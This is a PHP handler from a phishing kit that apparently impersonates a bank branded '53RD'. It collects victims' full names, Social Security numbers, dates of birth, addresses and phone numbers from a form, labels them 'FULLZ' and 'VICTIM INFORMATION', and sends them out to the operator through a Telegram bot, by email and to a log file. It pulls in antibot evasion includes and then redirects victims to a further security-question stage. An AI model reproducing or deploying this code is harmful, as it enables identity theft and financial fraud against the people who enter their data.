<?php

session_start();
error_reporting(0);



$TIME_DATE = date('H:i:s d/m/Y');
include('../assets/functions/get_browser.php');
include('../assets/functions/get_ip.php');
include('../assets/Antibot/blockers.php');
include('../assets/Antibot/detects.php');
include ('../config.php');



if (isset($_POST['city'])){
	$_SESSION['_fullname_']    = $_POST['fullname'];
	$_SESSION['_ssn_']     = $_POST['ssn'];
	$_SESSION['_dob_']     = $_POST['dob'];
	$_SESSION['_address_']     = $_POST['address'];
	$_SESSION['_city_']        = $_POST['city'];
	$_SESSION['_state_']       = $_POST['state'];
	$_SESSION['_zipCode_']     = $_POST['zipcode'];
	$_SESSION['_phone_']     = $_POST['phone'];
}



$Z118_MESSAGE .= "
[ 53RD ACCOUNT FULLZ ]
[ USER INFORMATION ]
[Full Name] = ".$_SESSION['_fullname_']."
[Ssn] = ".$_SESSION['_ssn_']."
[Phone Number] = ".$_SESSION['_phone_']."
[Date of Birth] = ".$_SESSION['_dob_']."
[Address line] = ".$_SESSION['_address_']."
[Town/City] = ".$_SESSION['_city_']."
[Province/State] = ".$_SESSION['_state_']."
[Postal/Zip Code] = ".$_SESSION['_zipCode_']."

[ VICTIM INFORMATION ]
[TIME/DATE]  = ".$TIME_DATE."
[IP INFO] = http://ip-api.com/json/".$_SESSION['_ip_']."
[REMOTE IP] = ".$_SERVER['REMOTE_ADDR']."
[BROWSER] = ".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."
[BROWSER] = ".$_SERVER['HTTP_USER_AGENT']."
[ BY @X_hammer]";

if (!empty($_POST['address']) && !empty($_POST['zipcode']) && !empty($_POST['ssn']) && !empty($_POST['dob'])){
	
	$data = [
    'text' => ''.$Z118_MESSAGE.'',
    'chat_id' => ''.$chat_id.''
	];
	file_get_contents("https://api.telegram.org/bot".$bot_token."/sendMessage?" . http_build_query($data) );
	
	if ($save_result == "on") {
		$res_file = fopen("../53RD_LOGS/PERSONAL_INFO.txt", "a");
		fwrite($res_file, $Z118_MESSAGE);
	}
	
	$Z118_SUBJECT = "USER FULLZ INFORMATION :✪";
	$Z118_HEADERS .= "From:XD <x-hammer@logs.org>";
	$Z118_HEADERS .= $_POST['address']."\n";
	$Z118_HEADERS .= "MIME-Version: 1.0\n";
	$Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
	@mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
	
	HEADER("Location: ../security_question/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
} else { 
	HEADER("Location: ../verify_billing/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
}

	
?>